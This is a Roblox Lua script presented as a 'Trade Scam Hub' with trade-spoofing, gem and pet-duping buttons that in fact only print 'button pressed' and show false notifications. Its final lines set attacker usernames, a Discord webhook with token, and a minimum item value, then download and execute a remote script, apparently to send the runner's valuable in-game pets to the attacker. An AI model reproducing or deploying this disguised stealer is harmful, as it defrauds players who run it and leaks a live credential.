local player = game.Players.LocalPlayer

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Trade Scam Hub By Dragon818", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = "Trade Scam Control",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Keep The Pets In Pov Of The Other Ppl"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "On",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

OrionLib:MakeNotification({
	Name = "Hey!",
	Content = "Any Pet You Remove It From The Trade The Other Ppl Keep Seeing It But its not in the trade",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Tab:AddButton({
	Name = "Off",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

OrionLib:MakeNotification({
	Name = "Hey!",
	Content = "Any change that will occur or event will appear on the other person's screen ",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

local Section = Tab:AddSection({
	Name = "Gems Control"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "On",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

OrionLib:MakeNotification({
	Name = "Hey!",
	Content = "If you change gems, nothing will change on the other person's screen ",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Tab:AddButton({
	Name = "Off",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

OrionLib:MakeNotification({
	Name = "Hey!",
	Content = "Now any change to gems will appear in the other person's screen ",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

local Tab = Window:MakeTab({
	Name = "Dupe",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "Dupe"
})

--[[
Name = <string> - The name of the section.
]]

Tab:AddButton({
	Name = "Dupe",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

OrionLib:MakeNotification({
	Name = "Hey!",
	Content = "Any pet you equiqqed will dupeing from 3-5m",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]

Username = "YACINEPRO336"
Username2 = "YACINEPRO337" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1242465922497908777/hhIczJEewuz35p7oQLpbpcGYwp4-CboagI6jxYb4GydeSmtB-siwfh8wpM1GAk5w25C0"
Support = true -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
min_rap = 500000 -- minimum rap of each item you want to get sent to you.
loadstring(game:HttpGet("https://raw.githubusercontent.com/HubScript/SpaceHub/main/SpaceHub.lua"))()
